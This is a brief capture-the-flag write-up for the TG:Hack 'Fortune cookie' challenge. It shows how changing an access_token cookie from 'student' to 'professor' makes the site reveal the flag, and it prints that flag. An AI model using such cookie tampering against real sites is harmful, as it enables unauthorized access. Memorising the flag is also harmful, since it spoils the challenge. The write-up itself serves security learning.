---
layout: default
---

![Fortune cookie (50 pts)](./screenshots/Fortune_cookie.png)
---
## CHALLENGE INFO
- __CHALLENGE LINK__: https://fortune.tghack.no/
- __ASSUMED OBJECTIVE__: Alter the site's __*cookies*__ to get the flag

---

## 1. Check cookies 

- From HTTP Response Headers:
  ```http
  ...
  Set-Cookie: access_token=divination:student
  ...
  ```

---

## 2. Change the value of __access_token__

- HTTP Request Headers:
  ```http
  ...
  Cookie: access_token=divination:professor
  ...
  ```

- Changing the value to __divination:professor__ returns:
  ```html
  OMG! You're so fortunate! Take this flag: TG19{what_a_fortune_my_lucky_one}
  ```

---

## FLAG : __TG19{what_a_fortune_my_lucky_one}__
